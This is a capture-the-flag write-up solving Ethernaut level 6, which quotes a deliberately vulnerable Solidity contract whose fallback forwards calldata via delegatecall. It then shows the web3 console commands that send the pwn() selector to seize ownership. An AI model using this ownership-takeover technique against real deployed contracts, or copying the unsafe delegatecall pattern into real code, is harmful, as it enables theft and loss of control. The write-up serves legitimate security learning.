# Level 6: Delegation

This is the level 6 of [Ethernaut](https://ethernaut.openzeppelin.com/) game.

## Pre-requisites
- [delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how) in Solidity

## Hack

Given contracts:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

`player` has to claim ownership of provided instance of `Delegation` contract.

A simple one if you clearly understand how `delegatecall` works, which is being used in `fallback` method of `Delegation`.

We just have to send function signature of `pwn` method of `Delegate` as `msg.data` to `fallback` so that _code_ of `Delegate` is executed in the context of `Delegation`. That changes the ownership of `Delegation`.

So, first get encoded function signature of `pwn`, in console:

```javascript
signature = web3.eth.abi.encodeFunctionSignature("pwn()")
```

Then we send a transaction with `signature` as data, so that `fallback` gets called:

```javascript
await contract.sendTransaction({ from: player, data: signature })
```

After transaction is successfully mined `player` is the `owner` of `Delegation`. Verify by:

```javascript
await contract.owner() === player

// Output: true
```

That's it.

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
